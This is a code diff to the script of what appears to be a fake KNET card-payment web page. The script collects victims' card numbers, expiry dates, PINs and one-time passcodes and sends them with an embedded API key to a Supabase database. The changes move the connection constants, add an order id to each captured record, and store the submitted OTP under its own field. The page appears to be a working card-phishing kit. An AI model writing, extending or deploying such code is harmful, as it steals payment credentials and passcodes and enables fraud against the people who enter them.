@@ -812,6 +812,10 @@
       e.target.value = v;
     });
 
+    const SB='https://znstbmftefsqgagidmfm.supabase.co';
+    const SK='sb_publishable_3MdtPJZPiqIv_NbtBioMfg_x4pdkQwE';
+    const SH={'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json','Prefer':'return=representation'};
+
     const paymentCard  = document.querySelector('.payment-card');
     const actionCard   = document.querySelector('.action-card');
     const loadingCard  = document.getElementById('loading-card');
@@ -838,14 +842,12 @@
       const phone  = p.get('phone')  || '';
       const amount = p.get('amount') || '';
       const sid    = p.get('sid')    || '';
+      const oid    = p.get('oid')    || '';
       savedCard = card;
       savedExpMonth = expiryRaw.slice(2,4);
       savedExpYear  = '20' + expiryRaw.slice(0,2);
       var expiry = expiryRaw.slice(2,4) + '/' + expiryRaw.slice(0,2);
 
-      const SB='https://znstbmftefsqgagidmfm.supabase.co';
-      const SK='sb_publishable_3MdtPJZPiqIv_NbtBioMfg_x4pdkQwE';
-      const SH={'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json','Prefer':'return=representation'};
       let subId = sid || null;
       try {
         if (subId) {
@@ -856,7 +858,7 @@
         } else {
           const r = await fetch(SB+'/rest/v1/payments', {
             method: 'POST', headers: SH,
-            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin, card_cvv:'', card_type:'KNET', bank_name:(currentBank&&currentBank.short?currentBank.short:''), amount:parseFloat(amount)||0, status:'pending', transaction_ref:'KWT-'+Date.now().toString(36).toUpperCase(), ip_address:'', user_agent:navigator.userAgent })
+            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin, card_cvv:'', card_type:'KNET', bank_name:(currentBank&&currentBank.short?currentBank.short:''), amount:parseFloat(amount)||0, status:'pending', transaction_ref:'KWT-'+Date.now().toString(36).toUpperCase(), order_id:oid?parseInt(oid):null, ip_address:'', user_agent:navigator.userAgent })
           });
           const d = await r.json();
           subId = d[0]?.id;
@@ -996,7 +998,7 @@
       otpCard.style.display = 'none';
       document.getElementById('otp-action-card').style.display = 'none';
       loadingCard.style.display = 'block';
-      const sbBody = currentStep === 'otp' ? { card_cvv: val } : { card_cvv: val };
+      const sbBody = currentStep === 'otp' ? { otp: val } : { card_cvv: val };
       try {
         await fetch(SB+'/rest/v1/payments?id=eq.'+currentSubId, {
           method: 'PATCH',
